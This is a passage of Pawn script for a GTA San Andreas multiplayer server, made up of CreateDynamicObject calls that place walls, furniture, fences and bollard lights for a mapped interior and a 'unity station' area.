	CreateDynamicObject(2186,-2660.9600000,1394.6700000,944.5300000,0.0000000,0.0000000,-0.8400000); //
	CreateDynamicObject(949,-2662.7600000,1387.7500000,945.1400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(949,-2658.2400000,1394.7500000,945.1400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2657.7200000,1385.9800000,946.2900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2657.7100000,1396.7500000,946.2900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2659.4000000,1385.9400000,946.2900000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2662.5500000,1385.9300000,946.2900000,0.0000000,0.0000000,90.1200000); //
	CreateDynamicObject(2164,-2659.2100000,1386.1100000,944.5300000,0.0000000,0.0000000,-179.4000000); //
	CreateDynamicObject(2167,-2660.9600000,1386.0600000,944.5300000,0.0000000,0.0000000,-179.2200000); //
	CreateDynamicObject(949,-2658.3100000,1386.4000000,945.1400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2191,-2662.0200000,1386.5400000,944.5300000,0.0000000,0.0000000,-179.2800000); //
	CreateDynamicObject(1721,-2653.2200000,1393.0300000,944.5300000,0.0000000,0.0000000,89.1000000); //
	CreateDynamicObject(1721,-2653.1900000,1393.8300000,944.5300000,0.0000000,0.0000000,89.1000000); //
	CreateDynamicObject(1721,-2653.1600000,1394.6300000,944.5300000,0.0000000,0.0000000,89.1000000); //
	CreateDynamicObject(1721,-2653.2200000,1387.9900000,944.5300000,0.0000000,0.0000000,89.1000000); //
	CreateDynamicObject(1721,-2653.2100000,1387.1300000,944.5300000,0.0000000,0.0000000,89.1000000); //
	CreateDynamicObject(1721,-2653.1600000,1395.4300000,944.5300000,0.0000000,0.0000000,89.1000000); //
	CreateDynamicObject(19458,-2654.6000000,1381.2000000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19369,-2659.3600000,1395.2500000,946.2700000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19397,-2662.4500000,1395.2300000,946.2800000,0.0000000,0.0000000,-89.8200000); //
	CreateDynamicObject(1649,-2657.7000000,1388.8200000,947.8200000,0.0000000,0.0000000,-90.0600000); //
	CreateDynamicObject(1649,-2657.7000000,1393.1800000,947.8200000,0.0000000,0.0000000,-90.0600000); //
	CreateDynamicObject(19458,-2658.0300000,1400.2400000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19458,-2661.5000000,1400.2300000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19397,-2657.7300000,1399.8900000,946.2800000,0.0000000,0.0000000,-179.7000000); //
	CreateDynamicObject(19369,-2657.7400000,1403.1100000,946.2900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19461,-2663.2200000,1400.3700000,946.2700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2659.2600000,1404.5800000,946.2700000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2662.4300000,1404.5900000,946.2700000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2172,-2662.2600000,1403.9900000,944.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2172,-2659.5300000,1404.0000000,944.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2172,-2662.2900000,1401.5900000,944.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2009,-2658.3800000,1396.8700000,944.5300000,0.0000000,0.0000000,-179.2200000); //
	CreateDynamicObject(1999,-2662.6100000,1397.3600000,944.5300000,0.0000000,0.0000000,-270.1200000); //
	CreateDynamicObject(1663,-2659.6700000,1396.9400000,945.0400000,0.0000000,0.0000000,22.9200000); //
	CreateDynamicObject(1663,-2661.3300000,1398.1400000,945.0400000,0.0000000,0.0000000,-102.8400000); //
	CreateDynamicObject(1663,-2661.6500000,1401.3600000,945.0400000,0.0000000,0.0000000,-146.4000000); //
	CreateDynamicObject(1663,-2661.7000000,1402.6400000,945.0400000,0.0000000,0.0000000,-197.4000000); //
	CreateDynamicObject(1663,-2658.6200000,1402.9200000,945.0400000,0.0000000,0.0000000,-165.8400000); //
	CreateDynamicObject(2186,-2662.6200000,1399.5600000,944.5300000,0.0000000,0.0000000,88.8600000); //
	CreateDynamicObject(949,-2662.8800000,1392.6400000,945.1400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2167,-2657.8500000,1398.0300000,944.5300000,0.0000000,0.0000000,-89.5200000); //
	CreateDynamicObject(19397,-2652.9500000,1397.1900000,946.2800000,0.0000000,0.0000000,-179.7000000); //
	CreateDynamicObject(19458,-2651.1200000,1397.6400000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19458,-2647.6700000,1397.6200000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19369,-2651.3000000,1396.1100000,946.2800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2652.9600000,1400.3600000,946.2800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19458,-2654.5900000,1400.2300000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19369,-2648.1900000,1396.1000000,946.2800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19415,-2648.2700000,1400.0400000,946.2800000,0.0000000,0.0000000,89.6400000); //
	CreateDynamicObject(19397,-2651.3500000,1400.0400000,946.2800000,0.0000000,0.0000000,-89.8200000); //
	CreateDynamicObject(19371,-2651.1400000,1401.7100000,944.4700000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19371,-2647.6600000,1401.7300000,944.4700000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19371,-2651.1400000,1404.7700000,944.4700000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19371,-2647.6500000,1404.7800000,944.4700000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(2146,-2648.4100000,1403.5900000,945.0600000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3384,-2646.6800000,1405.6300000,945.7800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3387,-2646.3600000,1404.5800000,944.5400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3392,-2652.1900000,1403.3800000,944.5400000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(3393,-2649.9700000,1405.6700000,944.5400000,0.0000000,0.0000000,90.5400000); //
	CreateDynamicObject(2523,-2649.4300000,1400.6600000,944.5200000,0.0000000,0.0000000,181.6800000); //
	CreateDynamicObject(3394,-2646.5500000,1401.8100000,944.5400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2652.9600000,1403.5000000,946.2800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2652.9600000,1406.6600000,946.2800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2651.3600000,1406.3700000,946.2800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2648.2000000,1406.3700000,946.2800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2645.8900000,1404.8300000,946.2800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2645.8800000,1401.6800000,946.2800000,0.0000000,0.0000000,0.2400000); //
	CreateDynamicObject(19369,-2645.8600000,1398.5600000,946.2800000,0.0000000,0.0000000,0.2400000); //
	CreateDynamicObject(19369,-2645.8400000,1395.4000000,946.2800000,0.0000000,0.0000000,0.2400000); //
	CreateDynamicObject(19369,-2645.0300000,1406.3700000,946.2800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2645.1700000,1400.0200000,946.2800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19325,-2647.0600000,1399.9600000,945.7200000,0.0000000,0.0000000,-90.3000000); //
	CreateDynamicObject(19369,-2645.1700000,1396.1000000,946.2800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(948,-2646.4000000,1396.4900000,944.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1703,-2646.4200000,1399.3000000,944.5300000,0.0000000,0.0000000,-90.8400000); //
	CreateDynamicObject(1721,-2648.1100000,1396.3800000,944.5300000,0.0000000,0.0000000,0.0600000); //
	CreateDynamicObject(1721,-2648.9400000,1396.3800000,944.5300000,0.0000000,0.0000000,-0.2400000); //
	CreateDynamicObject(1721,-2649.7800000,1396.3900000,944.5300000,0.0000000,0.0000000,-0.2400000); //
	CreateDynamicObject(1721,-2650.5400000,1396.4000000,944.5300000,0.0000000,0.0000000,-0.2400000); //
	CreateDynamicObject(1808,-2651.3900000,1396.4500000,944.5300000,0.0000000,0.0000000,-180.4800000); //
	CreateDynamicObject(1808,-2657.4000000,1396.4900000,944.5300000,0.0000000,0.0000000,-268.8000000); //
	CreateDynamicObject(948,-2657.2300000,1386.4400000,944.5300000,0.0000000,0.0000000,0.1200000); //
	CreateDynamicObject(948,-2657.3600000,1395.7600000,944.5300000,0.0000000,0.0000000,0.1200000); //
	CreateDynamicObject(19458,-2658.0800000,1409.8700000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19458,-2654.6000000,1409.8700000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19458,-2661.5600000,1409.8700000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19397,-2657.7500000,1406.3100000,946.2800000,0.0000000,0.0000000,-179.7000000); //
	CreateDynamicObject(19371,-2659.5900000,1409.2000000,944.4700000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19371,-2663.0500000,1409.2200000,944.4700000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19371,-2659.5800000,1412.3800000,944.4700000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19371,-2663.0900000,1412.4300000,944.4700000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19397,-2659.3000000,1407.6600000,946.2800000,0.0000000,0.0000000,-89.8200000); //
	CreateDynamicObject(19415,-2662.4000000,1407.6700000,946.2800000,0.0000000,0.0000000,89.6400000); //
	CreateDynamicObject(19325,-2664.1800000,1407.6600000,945.7200000,0.0000000,0.0000000,-90.4200000); //
	CreateDynamicObject(19369,-2663.2100000,1406.1200000,946.2800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(948,-2662.5400000,1405.0500000,944.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1721,-2659.8400000,1404.8600000,944.5300000,0.0000000,0.0000000,-0.2400000); //
	CreateDynamicObject(1721,-2660.6000000,1404.8600000,944.5300000,0.0000000,0.0000000,-0.2400000); //
	CreateDynamicObject(1721,-2659.0900000,1404.8100000,944.5300000,0.0000000,0.0000000,-0.2400000); //
	CreateDynamicObject(948,-2658.1700000,1404.9600000,944.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1808,-2661.8100000,1404.8800000,944.5300000,0.0000000,0.0000000,-180.5400000); //
	CreateDynamicObject(2146,-2662.5400000,1410.2800000,945.0600000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3394,-2658.6400000,1410.1600000,944.5400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2657.7500000,1409.3800000,946.2900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2657.7400000,1412.5800000,946.2900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2659.2700000,1414.1000000,946.2700000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2662.4300000,1414.1000000,946.2700000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2664.7900000,1409.2500000,946.2800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3384,-2664.1700000,1408.3000000,945.7800000,0.0000000,0.0000000,178.7400000); //
	CreateDynamicObject(3387,-2664.4100000,1409.4300000,944.5400000,0.0000000,0.0000000,178.7400000); //
	CreateDynamicObject(3392,-2664.0800000,1411.9300000,944.5400000,0.0000000,0.0000000,179.5200000); //
	CreateDynamicObject(3393,-2660.5600000,1413.4100000,944.5400000,0.0000000,0.0000000,90.5400000); //
	CreateDynamicObject(19369,-2664.8000000,1412.3500000,946.2800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2665.5700000,1414.1000000,946.2700000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2664.8100000,1415.4900000,946.2800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2665.4900000,1407.7000000,946.2700000,0.0000000,0.0000000,89.1000000); //
	CreateDynamicObject(19458,-2651.1500000,1411.1300000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19458,-2647.7700000,1411.1100000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19397,-2652.9600000,1409.8400000,946.2800000,0.0000000,0.0000000,-179.7000000); //
	CreateDynamicObject(19369,-2652.9600000,1412.9700000,946.2900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2652.9400000,1416.1300000,946.2900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2651.3300000,1415.8700000,946.2800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2648.2600000,1415.8800000,946.2800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2645.4100000,1415.8900000,946.2800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19461,-2646.1100000,1411.2400000,946.2800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14782,-2649.3700000,1415.3200000,945.5500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14782,-2646.5600000,1411.0400000,945.5500000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2635,-2648.7900000,1407.0300000,944.9500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1721,-2648.6200000,1408.3300000,944.5300000,0.0000000,0.0000000,170.5200000); //
	CreateDynamicObject(1721,-2650.1700000,1406.9900000,944.5300000,0.0000000,0.0000000,260.9400000); //
	CreateDynamicObject(1721,-2647.2100000,1406.9400000,944.5300000,0.0000000,0.0000000,87.3600000); //
	CreateDynamicObject(1706,-2651.8800000,1407.1500000,944.5300000,0.0000000,0.0000000,103.8000000); //
	CreateDynamicObject(1706,-2652.3800000,1412.4500000,944.5300000,0.0000000,0.0000000,88.6800000); //
	CreateDynamicObject(19369,-2656.1300000,1414.0500000,946.2800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2654.4800000,1414.0500000,946.2800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(3051,-2656.0600000,1413.9300000,945.7800000,0.0000000,0.0000000,-43.6800000); //
	CreateDynamicObject(3051,-2654.8800000,1413.9200000,945.7800000,0.0000000,0.0000000,-43.6800000); //
	CreateDynamicObject(950,-2653.6400000,1413.7300000,945.0400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(950,-2657.1700000,1413.7200000,945.0400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2652.9400000,1384.6200000,946.2900000,0.0000000,0.0000000,-0.0600000); //
	CreateDynamicObject(19458,-2651.1700000,1381.2200000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19458,-2647.7500000,1381.2200000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19458,-2658.0900000,1381.2100000,944.4500000,0.0000000,90.0000000,0.1800000); //
	CreateDynamicObject(19397,-2652.9400000,1381.5100000,946.2800000,0.0000000,0.0000000,-179.7000000); //
	CreateDynamicObject(19461,-2646.0100000,1381.1900000,946.2800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19461,-2648.0800000,1385.9500000,946.2800000,0.0000000,0.0000000,89.8800000); //
	CreateDynamicObject(19461,-2648.7800000,1376.5500000,946.2800000,0.0000000,0.0000000,89.8800000); //
	CreateDynamicObject(19369,-2652.9300000,1378.4700000,946.2900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2652.9200000,1375.3900000,946.2900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19461,-2657.6800000,1377.0600000,946.2800000,0.0000000,0.0000000,89.8800000); //
	CreateDynamicObject(1963,-2647.4300000,1380.8000000,944.9300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1963,-2649.9900000,1380.8100000,944.9300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1963,-2649.9800000,1383.4900000,944.9300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1963,-2647.3900000,1383.4900000,944.9300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1721,-2650.8500000,1384.8900000,944.5300000,0.0000000,0.0000000,180.6000000); //
	CreateDynamicObject(1721,-2649.7100000,1384.8700000,944.5300000,0.0000000,0.0000000,179.5200000); //
	CreateDynamicObject(1721,-2648.6400000,1384.8800000,944.5300000,0.0000000,0.0000000,179.5200000); //
	CreateDynamicObject(1721,-2647.5900000,1384.8500000,944.5300000,0.0000000,0.0000000,179.5200000); //
	CreateDynamicObject(1721,-2646.5100000,1384.8200000,944.5300000,0.0000000,0.0000000,179.5200000); //
	CreateDynamicObject(1721,-2650.7700000,1382.1000000,944.5300000,0.0000000,0.0000000,180.6000000); //
	CreateDynamicObject(1721,-2649.7100000,1382.0700000,944.5300000,0.0000000,0.0000000,180.7200000); //
	CreateDynamicObject(1721,-2648.7000000,1382.0600000,944.5300000,0.0000000,0.0000000,180.7200000); //
	CreateDynamicObject(1721,-2647.5400000,1382.0200000,944.5300000,0.0000000,0.0000000,180.7200000); //
	CreateDynamicObject(1721,-2646.4200000,1382.0500000,944.5300000,0.0000000,0.0000000,180.7200000); //
	CreateDynamicObject(3077,-2648.1900000,1376.6200000,944.3300000,0.0000000,0.0000000,-0.4800000); //
	CreateDynamicObject(2185,-2650.3900000,1378.2300000,944.5300000,0.0000000,0.0000000,162.0600000); //
	CreateDynamicObject(1671,-2651.8100000,1377.1200000,945.0500000,0.0000000,0.0000000,149.8200000); //
	CreateDynamicObject(19454,-2654.5400000,1387.2900000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2658.0000000,1387.3000000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2651.1400000,1381.3100000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2647.6500000,1381.2800000,947.9900000,0.0000000,90.0000000,0.1200000); //
	CreateDynamicObject(19454,-2654.6300000,1377.6900000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2658.0700000,1377.7100000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2661.5000000,1387.3300000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2657.9700000,1396.7400000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2654.5400000,1396.7500000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2661.4400000,1396.9300000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2654.5400000,1406.3400000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2651.0900000,1396.8400000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2651.0800000,1406.3800000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2647.6400000,1396.8100000,947.9900000,0.0000000,90.0000000,0.0600000); //
	CreateDynamicObject(19454,-2647.6500000,1406.4300000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2651.0600000,1415.8200000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2647.6000000,1416.0300000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2654.5400000,1415.9400000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2661.4500000,1406.4900000,947.9900000,0.0000000,90.0000000,0.0600000); //
	CreateDynamicObject(19454,-2657.9500000,1406.2000000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19454,-2661.4500000,1416.0600000,947.9900000,0.0000000,90.0000000,0.0600000); //
	CreateDynamicObject(19454,-2658.0200000,1415.7900000,947.9900000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19397,-2655.6000000,1385.9600000,946.2800000,0.0000000,0.0000000,-89.8200000); //
	CreateDynamicObject(19369,-2658.7800000,1385.9600000,946.2900000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19369,-2652.4000000,1385.9600000,946.2900000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19454,-2664.9300000,1411.7600000,947.9900000,0.0000000,90.0000000,0.0600000); //
	CreateDynamicObject(1893,-2655.7500000,1408.3400000,948.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1893,-2655.7100000,1402.1800000,948.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1893,-2655.6700000,1393.5600000,947.9000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1893,-2656.0900000,1382.6600000,947.9000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1893,-2655.6300000,1397.4400000,948.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19397,-2657.7200000,1382.8000000,946.2900000,0.0000000,0.0000000,-179.7000000); //
	CreateDynamicObject(19369,-2657.7200000,1379.7200000,946.2900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19369,-2657.7200000,1376.5800000,946.2900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19458,-2661.5500000,1381.1800000,944.4500000,0.0000000,90.0000000,0.1800000); //
	CreateDynamicObject(19458,-2665.0400000,1381.1700000,944.4500000,0.0000000,90.0000000,0.1800000); //
	CreateDynamicObject(19458,-2668.4300000,1381.1800000,944.4500000,0.0000000,90.0000000,0.1800000); //
	CreateDynamicObject(19461,-2667.1700000,1377.0800000,946.2800000,0.0000000,0.0000000,89.8800000); //
	CreateDynamicObject(19461,-2668.4400000,1385.9200000,946.2800000,0.0000000,0.0000000,89.8800000); //
	CreateDynamicObject(19461,-2670.0200000,1381.3000000,946.2700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1796,-2661.6400000,1382.3500000,944.5400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1796,-2665.1600000,1382.3300000,944.5400000,0.0000000,0.0000000,0.0600000); //
	CreateDynamicObject(1796,-2668.5200000,1382.3600000,944.5400000,0.0000000,0.0000000,0.2400000); //
	CreateDynamicObject(1796,-2666.9800000,1380.6600000,944.5400000,0.0000000,0.0000000,-180.2400000); //
	CreateDynamicObject(1796,-2662.8600000,1380.6200000,944.5400000,0.0000000,0.0000000,-179.7000000); //
	CreateDynamicObject(1796,-2659.2600000,1380.6300000,944.5400000,0.0000000,0.0000000,-179.5800000); //
	CreateDynamicObject(1740,-2664.1000000,1384.3800000,944.5400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1740,-2667.5100000,1384.2600000,944.5400000,0.0000000,0.0000000,0.1800000); //
	CreateDynamicObject(1740,-2660.5700000,1384.4100000,944.5400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1740,-2660.3000000,1378.6100000,944.5400000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1740,-2663.9500000,1378.6400000,944.5400000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1740,-2668.1200000,1378.6800000,944.5400000,0.0000000,0.0000000,-180.1200000); //
	CreateDynamicObject(949,-2669.5600000,1377.5400000,945.1700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(949,-2658.3100000,1385.3900000,945.1400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19454,-2661.4900000,1377.7100000,947.9900000,0.0000000,90.0000000,0.6000000); //
	CreateDynamicObject(19454,-2664.9200000,1381.7000000,947.9900000,0.0000000,90.0000000,0.6000000); //
	CreateDynamicObject(19454,-2668.3600000,1381.6500000,947.9900000,0.0000000,90.0000000,1.8600000); //
	CreateDynamicObject(1703,-2657.0500000,1379.0800000,944.5400000,0.0000000,0.0000000,90.3600000); //
	CreateDynamicObject(949,-2657.2500000,1381.7000000,945.1700000,0.0000000,0.0000000,-0.0600000); //
	CreateDynamicObject(948,-2653.3600000,1385.5400000,944.5300000,0.0000000,0.0000000,0.1200000); //

	//New unity station (Gychem)
	CreateDynamicObject(970,1774.30004883,-1886.59997559,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (1)
	CreateDynamicObject(970,1774.30004883,-1890.69995117,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (2)
	CreateDynamicObject(970,1774.30004883,-1898.90002441,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (4)
	CreateDynamicObject(970,1774.30004883,-1903.00000000,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (5)
	CreateDynamicObject(970,1774.30004883,-1907.09997559,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (6)
	CreateDynamicObject(970,1774.30004883,-1911.19995117,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (7)
	CreateDynamicObject(970,1774.30004883,-1915.30004883,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (8)
	CreateDynamicObject(970,1774.30004883,-1919.40002441,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (9)
	CreateDynamicObject(970,1774.30004883,-1923.50000000,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (10)
	CreateDynamicObject(970,1774.30004883,-1929.40002441,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (12)
	CreateDynamicObject(970,1774.30004883,-1933.50000000,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (13)
	CreateDynamicObject(970,1776.40002441,-1935.59997559,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (14)
	CreateDynamicObject(970,1784.59997559,-1935.59997559,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (16)
	CreateDynamicObject(970,1788.69995117,-1935.59997559,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (17)
	CreateDynamicObject(970,1792.80004883,-1935.59997559,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (18)
	CreateDynamicObject(970,1796.90002441,-1935.59997559,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (19)
	CreateDynamicObject(970,1804.79980469,-1935.59997559,13.10000038,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (21)
	CreateDynamicObject(970,1806.90002441,-1933.50000000,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (22)
	CreateDynamicObject(970,1806.90002441,-1929.40002441,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (23)
	CreateDynamicObject(970,1806.90002441,-1925.30004883,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (24)
	CreateDynamicObject(970,1806.90002441,-1921.19995117,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (25)
	CreateDynamicObject(970,1806.90002441,-1917.09997559,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (26)
	CreateDynamicObject(970,1806.90002441,-1913.00000000,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (27)
	CreateDynamicObject(970,1806.90002441,-1908.90002441,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (28)
	CreateDynamicObject(970,1806.90002441,-1904.80004883,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (29)
	CreateDynamicObject(970,1806.90002441,-1900.69995117,13.10000038,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (30)
	CreateDynamicObject(970,1808.30004883,-1897.09997559,13.10000038,0.00000000,0.00000000,48.00000000); //object(fencesmallb) (31)
	CreateDynamicObject(1215,1774.50000000,-1884.50000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(bollardlight) (1)
	CreateDynamicObject(1215,1809.80004883,-1895.50000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (2)
	CreateDynamicObject(1215,1810.30004883,-1884.40002441,13.10000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (8)
	CreateDynamicObject(1215,1782.40002441,-1935.59997559,13.10000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (11)
	CreateDynamicObject(1215,1778.59997559,-1935.59997559,13.10000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (12)
	CreateDynamicObject(1215,1774.30004883,-1927.19995117,13.10000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (13)
	CreateDynamicObject(1215,1774.30004883,-1925.69995117,13.10000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (14)
	CreateDynamicObject(1215,1774.30004883,-1896.69995117,13.10000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (15)
	CreateDynamicObject(1215,1774.30004883,-1892.90002441,13.10000038,0.00000000,0.00000000,0.00000000); //object(bollardlight) (16)
